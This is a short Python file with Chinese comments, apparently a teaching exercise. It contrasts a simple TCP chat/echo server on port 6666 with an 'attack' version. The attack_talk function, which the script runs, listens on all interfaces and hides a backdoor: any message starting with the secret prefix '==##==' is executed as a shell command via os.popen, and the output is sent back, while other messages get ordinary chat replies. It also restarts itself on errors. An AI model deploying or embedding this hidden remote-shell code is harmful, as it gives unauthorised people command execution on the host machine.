import os, socket

def normal_talk():
    s = socket.socket()
    # s.bind(('127.0.0.1', 6666))     # 只允许本设备访问
    s.bind(('0.0.0.0', 6666))         # 所有IP地址均可以访问6666端口
    s.listen()
    chanel, client = s.accept()       # 无法接受多个客户端
    while True:
        # chanel, client = s.accept()     # 此时accept()会进入阻塞状态
        receive = chanel.recv(1024).decode()
        print(f"收到消息：{receive}")
        reply = receive.replace("吗？", "!")
        chanel.send(reply.encode())
    # s.close()                         # 在死循环之后的代码，不可执行

# 核心思路：客户端发送一条特殊字符串，里面包含要执行的命令，让服务器端执行命令并返回结果给客户端
def attack_talk():
    try:
        s = socket.socket()
        s.bind(('0.0.0.0', 6666))
        s.listen()
        chanel, client = s.accept()
        while True:
            receive = chanel.recv(1024).decode()

            # ==##==,command
            if receive.startswith('==##=='):
                command = receive.split(',')[-1]
                reply = os.popen(command).read()
                chanel.send(f"命令{command}的运行结果：\n{reply}".encode())
            else:
                print(f"收到消息：{receive}")
                reply = receive.replace("吗？", "!")
                chanel.send(reply.encode())
    except:
        s.close()
        attack_talk()

if __name__ == '__main__':
    # normal_talk()
    attack_talk()

